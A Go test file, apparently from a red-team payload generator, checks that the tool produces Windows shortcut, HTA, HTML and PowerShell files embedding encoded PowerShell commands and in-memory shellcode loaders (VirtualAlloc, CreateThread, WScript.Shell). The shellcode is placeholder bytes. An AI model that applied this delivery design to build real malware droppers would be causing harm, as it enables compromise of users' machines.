package services

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestDeliveryLNK verifies the generated .lnk is a valid shell link (starts
// with the HeaderSize + LinkCLSID) and embeds the encoded loader.
func TestDeliveryLNK(t *testing.T) {
	ds := &DeliveryService{}
	dir := t.TempDir()
	out := filepath.Join(dir, "x.lnk")

	shellcode := []byte{0xCC, 0x48, 0x8B, 0xC4}
	path, err := ds.Generate(DeliveryLNK, shellcode, out)
	if err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// HeaderSize little-endian 76
	if len(data) < 76 || data[0] != 76 {
		t.Fatalf("not a shell link header (len=%d)", len(data))
	}
	// LinkCLSID magic
	clsid := data[4:20]
	if string(clsid) != "\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46" {
		t.Fatalf("LinkCLSID missing: % x", clsid)
	}
	// Command line is stored as UTF-16LE strings; decode and check.
	u16 := func(b []byte) string {
		var sb strings.Builder
		for i := 0; i+1 < len(b); i += 2 {
			sb.WriteRune(rune(b[i]) | rune(b[i+1])<<8)
		}
		return sb.String()
	}
	s := u16(data)
	if !strings.Contains(s, "powershell") || !strings.Contains(s, "EncodedCommand") {
		t.Fatalf("lnk missing powershell command line")
	}
	t.Logf("lnk size=%d", len(data))
}

// TestDeliveryFormats verifies HTA / HTML / PS1 all contain a runnable loader
// and the base64 shellcode.
func TestDeliveryFormats(t *testing.T) {
	ds := &DeliveryService{}
	shellcode := []byte{0x90, 0x90, 0xCC}
	b64 := base64.StdEncoding.EncodeToString(shellcode)

	cases := map[DeliveryFormat][]string{
		DeliveryHTA:  {"VBScript", "CreateObject"},
		DeliveryHTML: {"VBScript", "WScript.Shell"},
		DeliveryPS1:  {"VirtualAlloc", "CreateThread"},
	}
	for format, markers := range cases {
		out := filepath.Join(t.TempDir(), "x."+string(format))
		path, err := ds.Generate(format, shellcode, out)
		if err != nil {
			t.Fatalf("%s: %v", format, err)
		}
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		s := string(data)
		if !strings.Contains(s, b64) && format != DeliveryHTML {
			// HTML embeds the encoded command, not the raw b64.
			t.Fatalf("%s: base64 shellcode missing", format)
		}
		for _, m := range markers {
			if !strings.Contains(s, m) {
				t.Fatalf("%s: marker %q missing", format, m)
			}
		}
	}
}
